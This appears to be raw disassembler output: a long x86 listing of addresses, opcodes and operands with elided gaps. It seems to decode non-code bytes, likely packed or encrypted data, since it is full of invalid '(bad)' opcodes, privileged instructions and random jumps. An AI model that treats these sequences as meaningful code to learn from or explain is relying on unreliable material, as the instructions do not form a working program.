  415ec5:	lock add BYTE PTR [eax],al
  415ec8:	test   BYTE PTR [eax],0x0
  415ecb:	add    ch,dl
  415ecd:	retf   
  415ece:	or     ch,BYTE PTR ds:0xcea4e784
  415ed4:	lea    ebx,[eax-0x28]
  415ed7:	into   
  415ed8:	jge    0x415f2c
  415eda:	cld    
  415edb:	adc    eax,0x54ccc830
  415ee0:	sub    DWORD PTR [eax+0x13],ecx
  415ee3:	clc    
  415ee4:	pop    esp
  415ee5:	and    esp,ebp
  415ee7:	div    BYTE PTR [ecx-0x4f]
  415eea:	push   esp
  415eeb:	or     DWORD PTR cs:[edi-0x2a4f19b9],eax
  415ef2:	fadd   QWORD PTR [edi+ebp*8]
  415ef5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415ef6:	cs je  0x415eba
  415ef9:	hlt    
  415efa:	xchg   esp,eax
  415efb:	into   
  415efc:	xlat   BYTE PTR ds:[ebx]
  415efd:	and    DWORD PTR [ecx+0x631f3c8e],esp
  415f03:	enter  0x24b3,0xc8
  415f07:	nop
  415f08:	gs in  al,0x15
  415f0b:	daa    
  415f0c:	xor    eax,0x59a15429
  415f11:	mov    dl,0x8f
  415f13:	je     0x415efc
  415f15:	xchg   ebx,eax
  415f16:	push   0x77e8867b
  415f1b:	mov    dh,0x40
  415f1d:	mov    ch,BYTE PTR [ebp+0x3b]
  415f20:	xchg   ebx,eax
  415f21:	cdq    
  415f22:	gs ret 0xf712
  415f26:	pop    eax
  415f27:	dec    eax
  415f28:	adc    BYTE PTR [edx+0x36aa8022],0x91
  415f2f:	dec    ecx
  415f30:	xchg   esi,eax
  415f31:	inc    esp
  415f32:	mov    ecx,0xcd35f7f9
  415f37:	push   esi
  415f38:	test   eax,0xde2e385f
  415f3d:	and    edi,DWORD PTR [esi]
  415f3f:	(bad)  
  415f40:	daa    
  415f41:	sub    al,0x15
  415f43:	pushf  
  415f44:	and    bh,0xd7
  415f47:	lods   al,BYTE PTR ds:[esi]
  415f48:	inc    edi
  415f49:	adc    bl,BYTE PTR [ebx]
  415f4b:	int3   
  415f4c:	pushf  
  415f4d:	retf   0x45e5
  415f50:	int    0x1f
  415f52:	addr16 xchg ecx,eax
  415f54:	and    bh,BYTE PTR [edx]
  415f56:	mov    ecx,ebx
  415f58:	rcr    esi,1
  415f5a:	fs mov ecx,0xab6ddcb6
  415f60:	sbb    DWORD PTR [ecx-0x111cea72],esi
  415f66:	stos   DWORD PTR es:[edi],eax
  415f67:	or     BYTE PTR [ebp-0x4663f92e],dl
  415f6d:	jb     0x415fb6
  415f6f:	sbb    BYTE PTR [ebp-0x85b85a],dl
  415f75:	aas    
  415f76:	icebp  
  415f77:	sub    DWORD PTR [esi],edx
  415f79:	lea    esi,[ebp+0x6b]
  415f7c:	sbb    ch,BYTE PTR ds:0x3fec45fb
  415f82:	fisttp WORD PTR [edx-0x3b2abd09]
  415f88:	icebp  
  415f89:	dec    edx
  415f8a:	cwde   
  415f8b:	ficom  DWORD PTR [ebx-0x16]
  415f8e:	icebp  
  415f8f:	dec    ebx
  415f90:	and    DWORD PTR [edx+0x39194d8a],esp
  415f96:	ret    
  415f97:	ins    DWORD PTR es:[edi],dx
  415f98:	cmp    ebx,DWORD PTR [eax+ebx*1]
  415f9b:	lock stos BYTE PTR es:[edi],al
  415f9d:	xchg   ebx,eax
  415f9e:	adc    DWORD PTR [ebx-0x7a901c39],ebx
  415fa4:	ret    
  415fa5:	sahf   
  415fa6:	cmp    BYTE PTR [ebp+0x28],cl
  415fa9:	leave  
  415faa:	mov    esp,ecx
  415fac:	shl    BYTE PTR [ebx-0x4d],0x6a
  415fb0:	mov    esi,0xf973312b
  415fb5:	xor    DWORD PTR [ecx+0x471db6e0],ebp
  415fbb:	dec    ecx
  415fbc:	jp     0x415fa5
  415fbe:	xchg   ecx,eax
  415fbf:	inc    ebp
  415fc0:	mov    edx,0xce
	...
  416031:	add    BYTE PTR [eax],al
  416033:	add    BYTE PTR [ebx+0x2],bh
  416036:	add    ebp,ebx
  416038:	jnp    0x416025
  41603a:	sti    
  41603b:	xchg   edx,eax
  41603c:	rol    al,cl
  41603e:	(bad)  
  41603f:	imul   esi,eax,0x7a
  416042:	aas    
  416043:	loope  0x416059
  416045:	icebp  
  416046:	add    BYTE PTR [eax],al
  416048:	test   BYTE PTR [eax],0x0
  41604b:	add    BYTE PTR [edi],dh
  41604d:	mov    bl,0xe4
  41604f:	dec    ebp
  416050:	sti    
  416051:	sbb    eax,0x741dd0ba
  416056:	test   al,0x7d
  416058:	xor    ch,BYTE PTR [ecx]
  41605a:	js     0x4160b5
  41605c:	into   
  41605d:	aad    0x73
  41605f:	and    ebx,DWORD PTR [esi]
  416061:	mov    ds:0xee2fd663,al
  416066:	paddsw mm7,QWORD PTR gs:[ebx-0x58]
  41606b:	sbb    cl,al
  41606d:	inc    esp
  41606e:	jo     0x416011
  416070:	sbb    bl,BYTE PTR [ebp+0x65]
  416073:	dec    ebx
  416074:	xor    BYTE PTR [edi-0x1268263c],bh
  41607a:	jae    0x41601c
  41607c:	aaa    
  41607d:	fild   DWORD PTR [ebx]
  41607f:	(bad)  
  416080:	aam    0xb9
  416082:	cmp    BYTE PTR [ebx-0x64e40368],dl
  416088:	mov    ch,0x51
  41608a:	or     esp,edx
  41608c:	out    dx,eax
  41608d:	inc    ecx
  41608e:	in     al,0xc2
  416090:	mov    DWORD PTR [eax],0x83624e3f
  416096:	cwde   
  416097:	xor    ch,al
  416099:	adc    bh,BYTE PTR [ebx+0x58]
  41609c:	inc    edx
  41609d:	adc    bl,BYTE PTR [esi+0x6fa03f30]
  4160a3:	in     eax,0xff
  4160a5:	stos   DWORD PTR es:[edi],eax
  4160a6:	stc    
  4160a7:	(bad)  
  4160a8:	repnz rcr edi,cl
  4160ab:	pop    eax
  4160ac:	stos   BYTE PTR es:[edi],al
  4160ad:	dec    esi
  4160ae:	xor    edi,0x32
  4160b1:	xor    bl,BYTE PTR [edx-0x4f]
  4160b4:	add    ebx,DWORD PTR ds:0xe624c984
  4160ba:	ja     0x416137
  4160bc:	repz and ah,dh
  4160bf:	add    al,0x60
  4160c1:	test   eax,0x775df2c3
  4160c6:	mov    edx,0xec6c5150
  4160cb:	arpl   WORD PTR [ecx-0x5587c471],ax
  4160d1:	jo     0x4160ac
  4160d3:	sub    al,0x31
  4160d5:	icebp  
  4160d6:	mov    ecx,0xac62c2fd
  4160db:	inc    eax
  4160dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4160dd:	sbb    edi,eax
  4160df:	in     al,0x65
  4160e1:	lahf   
  4160e2:	jb     0x4160d8
  4160e4:	mov    WORD PTR [edx],gs
  4160e6:	mov    eax,ds:0x2f214a73
  4160eb:	loope  0x41610e
  4160ed:	and    DWORD PTR [esi+0x5],eax
  4160f0:	xor    DWORD PTR [edx],0x5cf7a7a4
  4160f6:	ret    
  4160f7:	bound  eax,QWORD PTR [eax]
  4160f9:	mov    edx,ds
  4160fb:	pop    ebp
  4160fc:	push   ss
  4160fd:	stos   BYTE PTR es:[edi],al
  4160fe:	out    0x4a,eax
  416100:	jp     0x416106
  416102:	cmp    al,0x7b
  416104:	or     ch,BYTE PTR [edi+edi*1-0xf]
  416108:	out    dx,eax
  416109:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41610a:	sub    eax,0x26304228
  41610f:	push   ebx
  416110:	jb     0x4160fe
  416112:	mov    esi,0xf182e37b
  416117:	int    0xf1
  416119:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41611b:	push   esp
  41611c:	stos   BYTE PTR es:[edi],al
  41611d:	sub    ch,BYTE PTR [esi]
  41611f:	outs   dx,DWORD PTR ds:[esi]
  416120:	lds    ebx,FWORD PTR [ecx+0x36]
  416123:	sbb    eax,0xad9c043c
  416128:	int3   
  416129:	sbb    BYTE PTR [eax+0x6ab945bf],0x44
  416130:	cs pop edi
  416132:	jno    0x4161af
  416134:	sbb    cl,ah
  416136:	fild   DWORD PTR [ebx-0x5df46e30]
  41613c:	daa    
  41613d:	dec    esi
  41613e:	add    eax,DWORD PTR [ecx]
  416140:	out    0xa5,eax
	...
  4161b2:	add    BYTE PTR [eax],al
  4161b4:	sub    al,0x97
  4161b6:	pop    ds
  4161b7:	sar    DWORD PTR [edi-0x8001127],1
  4161bd:	test   al,0xcb
  4161bf:	sub    edi,DWORD PTR [edx+esi*4-0xdf5acba]
  4161c6:	add    BYTE PTR [eax],al
  4161c8:	test   BYTE PTR [eax],0x0
  4161cb:	add    BYTE PTR [esi+0x72],bh
  4161ce:	adc    BYTE PTR [ebx+ebx*4-0x1c],cl
  4161d2:	mov    ds:0x337af431,eax
  4161d7:	xchg   edi,eax
  4161d8:	ror    DWORD PTR [edi+0x26],1
  4161db:	in     al,dx
  4161dc:	(bad)  
  4161dd:	mov    bl,BYTE PTR fs:[edi+0x1b]
  4161e1:	inc    esi
  4161e2:	addr16 mov eax,ds:0xecb7
  4161e6:	enter  0x58ec,0x8f
  4161ea:	stos   DWORD PTR es:[edi],eax
  4161eb:	fisub  DWORD PTR [ecx+0x58]
  4161ee:	rcl    BYTE PTR [edi],0xc9
  4161f1:	xchg   ebx,eax
  4161f2:	das    
  4161f3:	pushf  
  4161f4:	mov    dh,0x1b
  4161f6:	adc    ebx,DWORD PTR [esi+0x5e75c99f]
  4161fc:	xor    BYTE PTR [esi],ch
  4161fe:	mov    BYTE PTR [esi+0x6f],ah
  416201:	add    DWORD PTR [edx],ebx
  416203:	or     DWORD PTR [edx],0x23310466
  416209:	mov    edi,0x35419df1
  41620e:	pushf  
  41620f:	cmp    DWORD PTR [ecx],ebx
  416211:	movaps XMMWORD PTR [ecx+eax*4],xmm3
  416215:	add    eax,0xa957fe67
  41621a:	cmp    dl,bh
  41621c:	push   cs
  41621d:	dec    edi
  41621e:	and    DWORD PTR [ecx+0x14],edx
  416221:	stos   BYTE PTR es:[edi],al
  416222:	mov    cl,BYTE PTR [esi-0x19]
  416225:	outs   dx,DWORD PTR ds:[esi]
  416226:	inc    ebp
  416227:	add    eax,0x299a6334
  41622c:	add    cl,BYTE PTR [ebx+0x56]
  41622f:	pushf  
  416230:	mov    bh,0xa6
  416232:	xor    eax,0x9dc1ad1
  416237:	push   ss
  416238:	repz pop ecx
  41623a:	push   ecx
  41623b:	das    
  41623c:	lods   eax,DWORD PTR ds:[esi]
  41623d:	cmp    ebx,DWORD PTR [eax]
  41623f:	sub    BYTE PTR ds:0xc1ae136a,dh
  416245:	out    0x8d,al
  416247:	cs push 0x571ea493
  41624d:	test   BYTE PTR [ecx+0x1c],bl
  416250:	mov    ebx,0xaea08529
  416255:	fwait
  416256:	dec    edx
  416257:	into   
  416258:	jg     0x4161dc
  41625a:	push   edx
  41625b:	adc    BYTE PTR [ebx+0x44],ch
  41625e:	inc    edx
  41625f:	pop    ss
  416260:	fstp   QWORD PTR [edi+ecx*2-0xa]
  416264:	ficom  DWORD PTR [ebp+0x36]
  416267:	jmp    0x2827:0xc468e8b4
  41626e:	xchg   DWORD PTR ds:0x4ab3219b,ebp
  416274:	daa    
  416275:	jb     0x41620f
  416277:	jle    0x41621c
  416279:	nop
  41627a:	test   BYTE PTR [eax-0x30a74e17],al
  416280:	and    DWORD PTR [edx-0x3c],0x85f9d49a
  416287:	mov    esp,0xce1c3f96
  41628c:	xor    al,0xf9
  41628e:	mov    ebx,0x823490c7
  416293:	mov    DWORD PTR [ebx],0x2897a87e
  416299:	and    eax,0xe98d5f0d
  41629e:	or     edi,edx
  4162a0:	jge    0x41625a
  4162a2:	ins    DWORD PTR es:[edi],dx
  4162a3:	and    eax,0xaf0d4d06
  4162a8:	mov    edx,0xe162c499
  4162ad:	retf   0x7f73
  4162b0:	pop    ss
  4162b1:	stc    
  4162b2:	leave  
  4162b3:	leave  
  4162b4:	xor    DWORD PTR [ecx],esi
  4162b6:	jno    0x416238
  4162b8:	lea    edx,[esi+0x2c]
  4162bb:	mov    dh,0x64
  4162bd:	cmp    al,0x4e
  4162bf:	cld    
  4162c0:	or     eax,0xce
	...
  416331:	add    BYTE PTR [eax],al
  416333:	add    BYTE PTR [ebp-0x10],ch
  416336:	repz jmp FWORD PTR cs:[edi]
  41633a:	std    
  41633b:	repz push eax
  41633d:	xchg   ecx,eax
  41633e:	scas   al,BYTE PTR es:[edi]
  41633f:	fisttp QWORD PTR [ebx+0x6f]
  416342:	xchg   esp,eax
  416343:	enter  0xf300,0x0
  416347:	add    dh,dh
  416349:	add    BYTE PTR [eax],al
  41634b:	add    BYTE PTR [ecx+0x2],cl
  41634e:	scas   eax,DWORD PTR es:[edi]
  41634f:	mov    ebx,0x9f531f76
  416354:	xor    eax,0xbf4c855d
  416359:	mov    ds:0x72efc526,al
  41635e:	adc    bl,bh
  416360:	scas   eax,DWORD PTR es:[edi]
  416361:	sahf   
  416362:	imul   esi,ebp,0xf28dc5c2
  416368:	push   edx
  416369:	lds    ecx,FWORD PTR [esi-0x2d]
  41636c:	sub    eax,DWORD PTR [ebx+0x13]
  41636f:	fxch   st(5)
  416371:	sub    bl,bl
  416373:	jmp    0xef3cf06a
  416378:	jge    0x416349
  41637a:	loop   0x41631c
  41637c:	lock lea ebx,[esp+eiz*2+0x47]
  416381:	jb     0x4163b2
  416383:	add    BYTE PTR [eax+0x301f874b],cl
  416389:	lods   eax,DWORD PTR ds:[esi]
  41638a:	scas   al,BYTE PTR es:[edi]
  41638b:	add    al,0xd3
  41638d:	add    eax,0x28fbc751
  416392:	cmc    
  416393:	and    DWORD PTR [esi],ebp
  416395:	dec    esp
  416396:	jmp    DWORD PTR [edx]
  416398:	cwde   
  416399:	mov    ah,0x33
  41639b:	mov    bl,0x65
  41639d:	sbb    al,0xe1
  41639f:	mov    eax,ds:0x226c6816
  4163a4:	addr16 sti 
  4163a6:	pop    ss
  4163a7:	pop    es
  4163a8:	or     DWORD PTR [eax-0x61],0xffffff93
  4163ac:	sbb    DWORD PTR [ecx-0x5a],edi
  4163af:	aam    0x83
  4163b1:	addr16 out dx,eax
  4163b3:	pop    ebp
  4163b4:	pop    edi
  4163b5:	mov    esi,DWORD PTR [esi]
  4163b7:	xor    bl,bh
  4163b9:	imul   ebp,DWORD PTR [edi+0x64],0x52
  4163bd:	cwde   
  4163be:	(bad)  
  4163bf:	cmp    DWORD PTR [ecx],edx
  4163c1:	ins    BYTE PTR es:[edi],dx
  4163c2:	cmp    ebx,eax
  4163c4:	xor    ebp,DWORD PTR [edx+esi*4]
  4163c7:	call   0x3b19794d
  4163cc:	adc    eax,0x21e92d97
  4163d1:	mov    ds:0x34cd35fa,al
  4163d6:	pop    ss
  4163d7:	or     DWORD PTR [eax],ebx
  4163d9:	xchg   DWORD PTR [ecx-0x7],ebx
  4163dc:	inc    edx
  4163dd:	cmp    ebx,edi
  4163df:	sar    BYTE PTR [edi],cl
  4163e1:	jl     0x41644e
  4163e3:	neg    DWORD PTR [eax+0x120c0f94]
  4163e9:	ret    
  4163ea:	enter  0xea5d,0x42
  4163ee:	mov    ecx,0x3d6d4bc7
  4163f3:	lock outs dx,DWORD PTR ds:[esi]
  4163f5:	call   0x25a23f37
  4163fa:	and    al,BYTE PTR [ebx]
  4163fc:	mov    esi,edi
  4163fe:	dec    ebx
  4163ff:	jle    0x4163ed
  416401:	mov    al,dl
  416403:	stos   BYTE PTR es:[edi],al
  416404:	mov    bl,0xba
  416406:	xor    bl,ah
  416408:	dec    ebx
  416409:	push   esp
  41640a:	loope  0x41640c
  41640c:	push   edi
  41640d:	xchg   ebx,eax
  41640e:	adc    eax,0x15de6975
  416413:	fadd   DWORD PTR [ebx+0x3c]
  416416:	sub    DWORD PTR [ebx+0x5c],eax
  416419:	or     ebx,ebx
  41641b:	xchg   ebx,eax
  41641c:	mov    WORD PTR [esi],cs
  41641e:	es xchg edi,eax
  416420:	fld    QWORD PTR [ebx-0x18a17729]
  416426:	cs mov dl,0x93
  416429:	fdiv   st(3),st
  41642b:	shl    DWORD PTR [edi-0x4a88c118],cl
  416431:	fidiv  WORD PTR [edi-0x66a0e82]
  416437:	and    DWORD PTR [eax],esp
  416439:	leave  
  41643a:	jp     0x416469
  41643c:	(bad)  
  41643d:	loopne 0x4164a1
  41643f:	adc    ecx,DWORD PTR [esi+0xf1]
	...
  4164b1:	add    BYTE PTR [eax],al
  4164b3:	add    ah,ah
  4164b5:	lock sub DWORD PTR [edx],ecx
  4164b8:	cmp    eax,0x4cfee7db
  4164bd:	or     BYTE PTR [ebx-0xa],ah
  4164c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4164c1:	xor    al,0x46
  4164c3:	psadbw mm6,mm3
  4164c6:	add    BYTE PTR [eax],al
  4164c8:	test   BYTE PTR [eax],0x0
  4164cb:	add    bh,cl
  4164cd:	lea    eax,[ecx-0x7e18a4a7]
  4164d3:	repz or bl,bl
  4164d6:	scas   eax,DWORD PTR es:[edi]
  4164d7:	pushf  
  4164d8:	xchg   ebx,eax
  4164d9:	test   eax,0x1665bf0
  4164de:	les    edi,FWORD PTR [esi+0x7c]
  4164e1:	dec    edx
  4164e2:	jb     0x4164a7
  4164e4:	daa    
  4164e5:	ins    DWORD PTR es:[edi],dx
  4164e6:	or     eax,0x7f4edb0d
  4164eb:	fwait
  4164ec:	sub    DWORD PTR [edi],ebx
  4164ee:	sbb    al,0x86
  4164f0:	xchg   edi,eax
  4164f1:	sahf   
  4164f2:	dec    eax
  4164f3:	loopne 0x4164c8
  4164f5:	adc    BYTE PTR [edi+0x4bca2355],0x98
  4164fc:	pop    eax
  4164fd:	(bad)  
  4164ff:	gs push edi
  416501:	popa   
  416502:	push   cs
  416503:	(bad)  
  416504:	sti    
  416505:	mov    ebp,DWORD PTR [eax]
  416507:	fcomp  DWORD PTR [ebp+0x6d7543a0]
  41650d:	mov    bl,0xcc
  41650f:	clc    
  416510:	sub    eax,0x134b5508
  416515:	jmp    0x416579
  416517:	cmp    al,0x3c
  416519:	or     DWORD PTR [edx+ebp*8+0x2ad4acbf],0xffffffd0
  416521:	mov    WORD PTR [eax-0x4f9d1472],?
  416527:	xlat   BYTE PTR ds:[ebx]
  416528:	into   
  416529:	jp     0x4164e0
  41652b:	and    ecx,edi
  41652d:	retf   0xcca5
  416530:	sbb    DWORD PTR [ebp-0x5a],edi
  416533:	xchg   esi,eax
  416534:	lahf   
  416535:	or     eax,0x4a750108
  41653a:	or     eax,DWORD PTR [edx]
  41653c:	jb     0x41651e
  41653e:	xchg   esp,eax
  41653f:	not    BYTE PTR [edx]
  416541:	or     ah,BYTE PTR [ecx*4-0x4f62b144]
  416548:	fs retf 0x33e5
  41654c:	sub    DWORD PTR [eax+0x40f3f3a7],0x4d
  416553:	jmp    0x5a7c578e
  416558:	les    ebx,FWORD PTR [esi-0x54]
  41655b:	push   0xfcbc9cdc
  416560:	scas   eax,DWORD PTR es:[edi]
  416561:	push   esp
  416562:	mov    ds:0xfe4c788c,al
  416567:	retf   0x9ad3
  41656a:	or     DWORD PTR [ebx+ebx*8],ebp
  41656d:	fsubr  QWORD PTR [ecx+0x29ac5129]
  416573:	inc    ebp
  416574:	loope  0x416513
  416576:	or     DWORD PTR [ebp-0x332cdeb2],edi
  41657c:	shl    DWORD PTR [ecx+0x7d],0x9
  416580:	loopne 0x4165fa
  416582:	mov    bh,0xd6
  416584:	std    
  416585:	mov    ah,0xee
  416587:	sub    al,0xe2
  416589:	cs out 0xf6,al
  41658c:	xor    bh,bl
  41658e:	cmp    eax,0x242cf474
  416593:	fidiv  WORD PTR [edi+0x334862eb]
  416599:	inc    edi
  41659a:	dec    edx
  41659b:	jnp    0x4165c3
  41659d:	scas   al,BYTE PTR es:[edi]
  41659e:	add    al,0x7e
  4165a0:	cli    
  4165a1:	ins    BYTE PTR es:[edi],dx
  4165a2:	push   esi
  4165a3:	pop    ebx
  4165a4:	adc    BYTE PTR [ebp-0x6f],cl
  4165a7:	ins    DWORD PTR es:[edi],dx
  4165a8:	dec    edx
  4165a9:	outs   dx,BYTE PTR ds:[esi]
  4165aa:	inc    ebx
  4165ab:	cmp    eax,0x3e5f05dc
  4165b0:	and    ebp,DWORD PTR [ecx-0x4ed83d9]
  4165b6:	mov    cl,0xcd
  4165b8:	mov    dl,0xca
  4165ba:	mov    dh,0x97
  4165bc:	in     al,dx
  4165bd:	pop    ebp
  4165be:	push   ebp
  4165bf:	pushf  
  4165c0:	jae    0x416542
	...
  416632:	add    BYTE PTR [eax],al
  416634:	ins    DWORD PTR es:[edi],dx
  416635:	call   0xbafd:0x67ff45bc
  41663c:	retf   
  41663d:	sbb    ah,dh
  41663f:	aad    0x4b
  416641:	fsubr  st(1),st
  416643:	retf   0xf4ec
  416646:	add    BYTE PTR [eax],al
  416648:	test   BYTE PTR [eax],0x0
  41664b:	add    BYTE PTR [ecx],al
  41664d:	xchg   edx,eax
  41664e:	cwde   
  41664f:	pop    ss
  416650:	adc    DWORD PTR [ebx-0x6cebad0],ecx
  416656:	ret    0x4c46
  416659:	in     al,0x60
  41665b:	adc    ah,al
  41665d:	mov    eax,0x23b4f2c1
  416662:	lahf   
  416663:	jg     0x4166aa
  416665:	jl     0x41668e
  416667:	mov    ds:0xe56b1265,al
  41666c:	add    DWORD PTR [ebx],0x7f
  41666f:	mov    edx,esi
  416671:	ins    BYTE PTR es:[edi],dx
  416672:	lods   eax,DWORD PTR ds:[esi]
  416673:	mov    ch,0xb
  416675:	mov    bl,0x6
  416677:	or     eax,0x98244f5
  41667c:	lock cmp DWORD PTR [edx-0x65],ecx
  416680:	push   ecx
  416681:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416682:	sub    ebp,DWORD PTR [edx]
  416684:	addr16 pop ss
  416686:	fdivr  st(4),st
  416688:	bound  ecx,QWORD PTR [esi-0x11]
  41668b:	lahf   
  41668c:	test   eax,0xa077eec1
  416691:	mov    bh,0xf
  416693:	pusha  
  416694:	xchg   esp,eax
  416695:	sub    BYTE PTR [ebx],0xb1
  416698:	scas   eax,DWORD PTR es:[edi]
  416699:	test   eax,0xb47c3818
  41669e:	inc    ebx
  41669f:	push   ds
  4166a0:	xor    DWORD PTR [esp+esi*8-0xcb696d4],eax
  4166a7:	cdq    
  4166a8:	outs   dx,BYTE PTR ds:[esi]
  4166a9:	xor    dh,BYTE PTR [esi-0x5646bf22]
  4166af:	xchg   ebx,eax
  4166b0:	xadd   BYTE PTR [ecx+0xc24355f],bl
  4166b7:	or     bl,dl
  4166b9:	test   DWORD PTR [edi],ecx
  4166bb:	clc    
  4166bc:	lock es aaa 
  4166bf:	ficomp DWORD PTR [esi-0x76]
  4166c2:	xchg   DWORD PTR [edi-0x1ccab4ce],ebp
  4166c8:	or     eax,0x33367e0c
  4166cd:	inc    esp
  4166ce:	test   al,0xa6
  4166d0:	sbb    DWORD PTR [edi+0x4c],esi
  4166d3:	jbe    0x4166ae
  4166d5:	sbb    DWORD PTR [eax+0x673cd1a0],esp
  4166db:	and    al,0x11
  4166dd:	cmc    
  4166de:	xchg   esi,eax
  4166df:	hlt    
  4166e0:	fsubr  st(4),st
  4166e2:	ins    BYTE PTR es:[edi],dx
  4166e3:	out    dx,eax
  4166e4:	cmp    eax,0x48ec9333
  4166e9:	push   ecx
  4166ea:	fwait
  4166eb:	dec    edx
  4166ec:	ret    
  4166ed:	mov    eax,ds:0x50cb5328
  4166f2:	inc    ecx
  4166f3:	or     BYTE PTR [esi],dh
  4166f5:	mov    bh,0xd1
  4166f7:	pop    ebp
  4166f8:	cmp    BYTE PTR [ebp-0x3fb15b02],al
  4166fe:	mov    eax,ds:0x4f4faafe
  416703:	loopne 0x41670f
  416705:	add    al,0x8f
  416707:	cmc    
  416708:	mov    WORD PTR [edi+0xe],cs
  41670b:	daa    
  41670c:	sar    BYTE PTR ds:0xfa5d00df,cl
  416712:	rol    DWORD PTR [edx-0x4c],1
  416715:	jge    0x4166d0
  416717:	and    BYTE PTR [edx+0x1f],dh
  41671a:	push   ebx
  41671b:	dec    esi
  41671c:	(bad)  
  41671e:	test   al,0x6c
  416720:	or     al,0x34
  416722:	repnz jmp 0x2c68:0xfac67719
  41672a:	adc    al,0x8c
  41672c:	ja     0x416700
  41672e:	pop    edx
  41672f:	stc    
  416730:	or     al,0x46
  416732:	pusha  
  416733:	xor    DWORD PTR [ebp-0x7],0xc1768880
  41673a:	test   DWORD PTR [edi+0x41b04072],0x119a
	...
  4167b4:	retf   
  4167b5:	(bad)  
  4167b6:	xchg   ebx,eax
  4167b7:	in     al,dx
  4167b8:	mov    bh,0xed
  4167ba:	(bad)  
  4167bb:	push   DWORD PTR [ecx+0x19]
  4167be:	comiss xmm0,DWORD PTR [edx]
  4167c1:	inc    ebp
  4167c2:	xchg   ebp,eax
  4167c3:	xor    dl,ah
  4167c5:	cmc    
  4167c6:	add    BYTE PTR [eax],al
  4167c8:	test   BYTE PTR [eax],0x0
  4167cb:	add    BYTE PTR [esi],cl
  4167cd:	pop    ebp
  4167ce:	sub    esp,DWORD PTR [eax]
  4167d0:	fxam   
  4167d2:	jns    0x41681c
  4167d4:	and    eax,0x784f8cc0
  4167d9:	push   ds
  4167da:	dec    edi
  4167db:	mov    bh,0x7f
  4167dd:	sbb    ch,BYTE PTR ss:[ebp+0x774944e8]
  4167e4:	inc    esp
  4167e5:	or     dl,0x42
  4167e8:	aaa    
  4167e9:	jmp    0x41683c
  4167eb:	push   es
  4167ec:	outs   dx,DWORD PTR ds:[esi]
  4167ed:	not    DWORD PTR [esi+0x3a74ff77]
  4167f3:	jne    0x4167c5
  4167f5:	sbb    DWORD PTR [ebx-0x86eb73d],esi
  4167fb:	cmp    DWORD PTR [edi+0x60],edi
  4167fe:	jns    0x4167b2
  416800:	rol    bh,cl
  416802:	call   0xd69d:0x96abdd60
  416809:	iret   
  41680a:	rcr    DWORD PTR [esi+0x6e],cl
  41680d:	mov    fs,WORD PTR [edi-0x730bc9ec]
  416813:	cmp    DWORD PTR [eax-0x56],eax
  416816:	lock in al,dx
  416818:	sub    cl,BYTE PTR [edi+eiz*4]
  41681b:	daa    
  41681c:	sbb    esi,DWORD PTR [ebx-0x26]
  41681f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416820:	sub    edi,0xb7949c0a
  416826:	cmp    edi,edx
  416828:	pop    ebx
  416829:	sbb    al,0x47
  41682b:	pop    ecx
  41682c:	mov    edi,0x29eeb85f
  416831:	mov    esi,0x45779e2a
  416836:	push   edi
  416837:	mov    ebx,0xfbff208c
  41683c:	sub    BYTE PTR [ebx+esi*4+0x18],0x81
  416841:	mov    fs,edi
  416843:	xchg   ebx,eax
  416844:	rcl    DWORD PTR [edi+eax*8+0x2c44725],1
  41684b:	js     0x4167e4
  41684d:	and    eax,DWORD PTR [esi]
  41684f:	cmc    
  416850:	popa   
  416851:	mov    al,BYTE PTR [ebp-0x19]
  416854:	inc    ebp
  416855:	sbb    al,ch
  416857:	push   es
  416858:	iret   
  416859:	inc    esi
  41685a:	or     eax,DWORD PTR [eax+0x74ea5fff]
  416860:	pop    edx
  416861:	adc    al,0xdd
  416863:	dec    ecx
  416864:	sti    
  416865:	je     0x41683f
  416867:	ret    0x688d
  41686a:	ret    0x6660
  41686d:	mov    al,ds:0xaac91695
  416872:	xchg   ecx,eax
  416873:	data16 mov bl,0xad
  416876:	push   esp
  416877:	pusha  
  416878:	inc    ebx
  416879:	sti    
  41687a:	fwait
  41687b:	jns    0x4168e4
  41687d:	loope  0x416884
  41687f:	ror    DWORD PTR [esp+ebx*8],cl
  416882:	mov    bh,0xef
  416884:	sahf   
  416885:	stos   DWORD PTR es:[edi],eax
  416886:	arpl   sp,bp
  416888:	pop    edx
  416889:	pop    esi
  41688a:	imul   esp,DWORD PTR [ebx-0x2a],0x22428883
  416891:	shl    BYTE PTR [esi],cl
  416893:	hlt    
  416894:	mov    dh,0x5e
  416896:	into   
  416897:	and    eax,0x1db5b77d
  41689c:	pushf  
  41689d:	xchg   esi,eax
  41689e:	loopne 0x416838
  4168a0:	mov    eax,ds:0x4f01daea
  4168a5:	mov    eax,ds:0x67f7b996
  4168aa:	stos   BYTE PTR es:[edi],al
  4168ab:	adc    eax,0x24473205
  4168b0:	mov    esp,0x73323436
  4168b5:	inc    DWORD PTR [ebx]
  4168b7:	repnz pop esi
  4168b9:	retf   0x2037
  4168bc:	xchg   ecx,eax
  4168bd:	out    0xb3,al
  4168bf:	xor    BYTE PTR [edx],ah
  4168c1:	pop    DWORD PTR [eax]
	...
  416933:	add    BYTE PTR [ebp-0x78],al
  416936:	sub    al,0x77
  416938:	in     eax,dx
  416939:	neg    DWORD PTR [edi-0x46]
  41693c:	push   eax
  41693d:	inc    ebp
  41693e:	push   ss
  41693f:	xor    DWORD PTR [edx-0x79],ebp
  416942:	loope  0x4168c7
  416944:	fdiv   st,st(6)
  416946:	add    BYTE PTR [eax],al
  416948:	test   BYTE PTR [eax],0x0
  41694b:	add    BYTE PTR [edx-0x6247d9ab],ah
  416951:	mov    ebp,0xf9ef20c4
  416956:	pop    esp
  416957:	fldcw  WORD PTR [ebp-0x6a0b471c]
  41695d:	mov    ds:0xbfb6b032,eax
  416962:	and    dl,BYTE PTR [esi+0x5d12800]
  416968:	neg    DWORD PTR [ebp-0x59bbca38]
  41696e:	fnstsw WORD PTR [edx+edx*8]
  416971:	ss pop esp
  416973:	in     al,dx
  416974:	mov    dl,BYTE PTR [esi+0x4a300d6d]
  41697a:	(bad)  
  41697b:	add    BYTE PTR [bp+si+0x55],bh
  41697f:	inc    edx
  416980:	fmulp  st(1),st
  416982:	xchg   edx,eax
  416983:	xor    dh,bl
  416985:	stos   DWORD PTR es:[edi],eax
  416986:	cmp    BYTE PTR [ecx+0xef3583f],ch
